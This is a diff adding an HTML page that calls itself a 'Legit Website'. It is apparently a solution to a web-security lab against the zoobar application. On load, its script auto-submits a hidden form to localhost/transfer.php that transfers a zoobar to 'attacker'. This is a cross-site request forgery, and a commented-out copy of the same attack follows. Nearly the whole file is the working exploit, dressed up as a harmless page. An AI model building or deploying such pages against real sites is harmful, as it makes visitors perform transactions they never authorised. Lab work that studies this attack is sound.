@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+
+	<head>
+		<title>Legit Website</title>
+	</head>
+
+	<body>
+		<h1>Welcome to a Non-sketchy Website!</h1>
+
+		<iframe id="myFrame" style=""></iframe>
+
+		<form id="myForm" action="localhost/transfer.php?" method="POST">
+			<input type="text" name="zoobars" value="1">
+			<input type="text" name="recepient" value="attacker">
+			<input type="text" name="submission" value="Send">
+		</form>
+
+		<script>
+			document.getElementById("myForm").submit();
+		</script>
+	</body>
+
+	<script>
+		f = document.getElementById("myFrame");
+		f.innerHTML = "<p>Hello vato!</p>"
+	</script>
+
+</html>
+
+<!-- 
+		
+
+			<form id="myForm" action="localhost/transfer.php?" method="POST">
+				<input type="text" name="zoobars" value="1">
+				<input type="text" name="recepient" value="attacker">
+				<input type="text" name="submission" value="Send">
+			</form>
+
+			<script>
+				document.getElementById("myForm").submit();
+			</script>
+ -->
